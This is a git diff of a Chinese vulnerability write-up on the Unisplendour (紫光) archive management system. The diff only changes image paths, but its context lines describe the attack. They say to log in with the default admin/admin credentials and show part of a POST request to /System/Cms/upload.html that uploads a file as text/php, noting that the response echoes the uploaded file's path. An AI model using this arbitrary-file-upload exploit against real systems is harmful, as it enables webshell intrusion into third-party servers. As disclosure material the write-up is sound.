@@ -20,11 +20,11 @@ app="紫光档案管理系统"
 
 登录页面
 
-![image-20230314084520184](images/image-20230314084520184.png)
+![image-20230314084520184](../.gitbook/assets/image-20230314084520184.png)
 
 使用默认口令登录后台 admin/admin, 发送请求包
 
-![image-20230314084534337](images/image-20230314084534337.png)
+![image-20230314084534337](../.gitbook/assets/image-20230314084534337.png)
 
 ```
 POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
@@ -59,8 +59,8 @@ Content-Type: text/php
 ------WebKitFormBoundarygIRYWNxmDYiZBguT--
 ```
 
-![image-20230314084553654](images/image-20230314084553654.png)
+![image-20230314084553654](../.gitbook/assets/image-20230314084553654.png)
 
 回显路径即为上传成功的文件路径
 
-![image-20230314084608438](images/image-20230314084608438.png)
+![image-20230314084608438](../.gitbook/assets/image-20230314084608438.png)
